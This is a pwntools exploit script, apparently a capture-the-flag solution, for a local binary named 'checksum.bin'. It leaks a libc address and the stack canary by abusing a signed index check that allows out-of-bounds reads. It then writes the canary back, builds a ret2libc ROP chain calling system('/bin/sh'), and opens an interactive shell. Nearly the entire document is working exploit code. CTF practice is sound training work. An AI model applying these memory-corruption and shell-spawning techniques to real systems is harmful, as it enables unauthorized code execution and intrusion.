from pwn import *
from exploit import exploit_source

if 'REMOTE' in args:
    p = remote("localhost", 872)
else:
    p = process("dist/checksum.bin")

context.arch = 'amd64'

bin = ELF("dist/checksum.bin")
libc = ELF("dist/libc-2.31.so")

def read_at(idx):
    p.sendlineafter("opt", "1")
    p.sendlineafter("idx", str(idx))
    p.recvuntil("<< ")
    n = int(p.recvline()[:-1])
    if n < 0: # get the positive number
        n = (1 << 64) + n
    return n

# 2-complements a number
def fmt_num(n):
    import struct
    return struct.unpack("q", p64(n))[0]

# history[12] has a leak to an address near libc
libc.address = read_at(12) - 0x32e8 - 2023424
success(f"{hex(libc.address) = }")

# history[17] has the stack canary
# However, we have a check: history_idx < 0x10.
# But the check is a signed comparison, so we can abuse
# that to give a negative number that will integer overflow
# when doing history[read_idx].

# After all, history[read_idx] = *(history + sizeof(history[0]) * read_idx)
canary = read_at(17 - (1 << 63)) # 17 with the sign bit = 1
success(f"{hex(canary) = }")


# ROP, ret2libc
r = ROP(libc)
r.raw(r.find_gadget(['ret'])) # for alignment (movaps in system)
r.system(next(libc.search(b"/bin/sh")))
chain = r.chain()

# history is at rbp-0x90
# canary is at  rbp-0x8

for i in range(17):
    p.sendlineafter("opt", "2")
    p.sendlineafter("x", str(0))

p.sendlineafter("opt", "2")
p.sendlineafter("x", str(fmt_num(canary))) 

p.sendlineafter("opt", "2")
p.sendlineafter("x", str(0)) # saved rbp

# return address

# here we just copy-paste our rop chain in
for b in range(len(chain)//8):
    p.sendlineafter("opt", "2")
    p.sendlineafter("x", str(fmt_num(u64(chain[8*b:][:8]))))

# force the return from the loop
p.sendlineafter("opt", "2")
p.sendlineafter("x", str(1337))


p.interactive()